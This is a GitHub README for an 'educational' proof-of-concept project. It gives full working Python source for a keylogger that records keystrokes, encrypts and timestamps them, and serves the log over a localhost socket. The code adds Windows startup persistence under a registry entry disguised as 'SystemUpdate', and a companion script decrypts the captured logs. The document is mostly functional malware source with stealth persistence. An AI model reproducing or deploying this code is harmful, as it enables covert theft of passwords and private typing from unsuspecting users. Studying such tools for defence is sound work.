# Elevate-Labs-Final-Project-Submission---Keylogger

## Educational Purposes Only

**Keylogger with Encrypted Data Exfiltration**       
**Objective:** Build a proof-of-concept keylogger that encrypts logs and simulates exfiltration.    

**Tools:** Python, pynput, cryptography, base64     
**Mini Guide:**
a. Capture keystrokes using pynput.     
b. Encrypt data using cryptography.fernet.    
c. Store logs locally with timestamp.       
d. Simulate sending to a remote server (localhost).    
e. Add startup persistence and kill switch.    

![image](https://github.com/user-attachments/assets/9eddcf20-65db-4d5b-a457-fb6a1ee65073)

![image](https://github.com/user-attachments/assets/1787008b-f066-41a7-821b-d97105ae4197)

![image](https://github.com/user-attachments/assets/60fe28d4-6bbe-436a-baa3-fa645d883e95)


**Deliverables: Encrypted Keylogger PoC with Ethical Constraints and Logs**

### 1. **Main Python Script**

**Filename:** `keylogger.py`     
**Contains:**

* Fernet key generation and loading
* Keystroke capture using `pynput`
* AES encryption of logs
* Log writing with timestamps
* Localhost TCP exfiltration using sockets
* Kill switch (`q!exit`)
* Windows startup persistence via registry

```python
import os
import socket
import threading
import base64
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import platform

# CONFIGURATION 
KEY_FILE = "key.key"
LOG_FILE = "encrypted_log.txt"
KILL_SWITCH = "q!exit"
log = ""

# Generate or Load Encryption Key
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)

def load_key():
    if not os.path.exists(KEY_FILE):
        generate_key()
    with open(KEY_FILE, "rb") as f:
        return f.read()

key = load_key()
fernet = Fernet(key)

# Encrypt and Write Logs
def encrypt_log(data):
    return fernet.encrypt(data.encode())

def write_log(encrypted_data):
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted_data + b"\n")

# Capturing Keystrokes    
def on_press(key):
    global log
    try:
        k = key.char
    except AttributeError:
        k = f"[{key}]"
    
    log += k

    if KILL_SWITCH in log:
        print("[*] Kill switch triggered. Stopping keylogger.")
        return False

    if len(log) >= 10:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f"[{timestamp}] {log}"
        encrypted = encrypt_log(data)
        write_log(encrypted)
        log = ""

# Simulate Exfiltration Server 
def simulate_exfiltration():
    def server():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("localhost", 4444))
            s.listen(1)
            print("[*] Exfiltration server running on localhost:4444")

            conn, addr = s.accept()
            print(f"[+] Connected from {addr}")

            with open(LOG_FILE, "rb") as f:
                for line in f:
                    try:
                        conn.sendall(line)
                    except (ConnectionResetError, ConnectionAbortedError) as ce:
                        print(f"[!] Connection closed by client: {ce}")
                        break
                    except Exception as e:
                        print(f"[!] Unexpected error: {e}")
                        break

            conn.close()
            s.close()

        except Exception as e:
            print(f"[!] Server error: {e}")

    threading.Thread(target=server, daemon=True).start()

# Windows Startup (Persistence)    
def add_startup():
    if platform.system().lower() == "windows":
        try:
            import winreg as reg
            file_path = os.path.realpath(__file__)
            key = reg.HKEY_CURRENT_USER
            key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
            open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(open_key, "SystemUpdate", 0, reg.REG_SZ, file_path)
            reg.CloseKey(open_key)
            print("[*] Persistence added to startup.")
        except Exception as e:
            print(f"[!] Persistence error: {e}")

# Starting Keylogger     
def start_keylogger():
    add_startup()
    simulate_exfiltration()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    print("[*] Starting Keylogger...")
    start_keylogger()

```

### 2. **Generated Key File**

**Filename:** `key.key`    
**Purpose:** Stores the Fernet symmetric encryption key.

### 3. **Encrypted Log File**

**Filename:** `encrypted_log.txt`    
**Contains:** 
Encrypted, timestamped keystroke entries.    

![image](https://github.com/user-attachments/assets/62caff5a-ddcd-4717-8e44-b33aa052944d)    
These are encrypted keystroke logs, sent from our keylogger to the local server (localhost:4444).


### 4. **Decryption Script (optional)**

**Filename:** `decrypt_logs.py`    
**What it does:** Reads `key.key` and `encrypted_log.txt`, decrypts entries, and displays readable logs.

```python
from cryptography.fernet import Fernet

with open("key.key", "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)

with open("encrypted_log.txt", "rb") as log_file:
    for line in log_file:
        try:
            decrypted = fernet.decrypt(line.strip()).decode()
            print(decrypted)
        except Exception as e:
            print(f"Failed to decrypt: {e}")
```


